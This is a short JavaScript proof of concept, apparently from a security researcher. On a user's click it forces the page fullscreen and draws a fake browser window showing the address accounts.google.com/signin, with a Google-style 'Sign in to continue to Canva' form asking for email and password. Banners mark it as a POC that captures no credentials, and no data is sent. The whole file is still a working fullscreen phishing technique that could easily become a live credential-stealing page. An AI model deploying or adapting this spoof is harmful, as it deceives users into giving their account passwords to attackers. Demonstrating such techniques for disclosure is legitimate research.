window.addEventListener('load', function() {
  document.body.addEventListener('click', function handler() {
    document.body.removeEventListener('click', handler);
    
    document.documentElement.requestFullscreen()
      .then(function() {
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.innerHTML = `
          <div style="display:flex;flex-direction:column;height:100vh;font-family:arial,sans-serif;">
            
            <div style="background:#ff4444;color:white;text-align:center;padding:12px;font-size:14px;font-weight:bold;">
               POC ONLY - No credentials captured
            </div>

            <div style="background:#f1f3f4;padding:8px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #ddd;">
              <div style="background:#fff;border:1px solid #ddd;border-radius:20px;padding:6px 16px;flex:1;font-size:14px;">
                https://accounts.google.com/signin
              </div>
            </div>

            <div style="display:flex;justify-content:center;align-items:center;flex:1;">
              <div style="width:400px;padding:40px;border:1px solid #ddd;border-radius:8px;text-align:center;">
                <h2 style="font-weight:400;">Sign in to continue to Canva</h2>
                <p style="color:red;font-size:13px;">[POC ONLY - No credentials captured]</p>
                <input type="email" placeholder="Email" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin-bottom:16px;box-sizing:border-box;"/>
                <input type="password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin-bottom:24px;box-sizing:border-box;"/>
                <button style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;">Next</button>
              </div>
            </div>

          </div>
        `;
      })
      .catch(function(e) {
        console.log('fullscreen failed:', e.message);
      });
  });
});
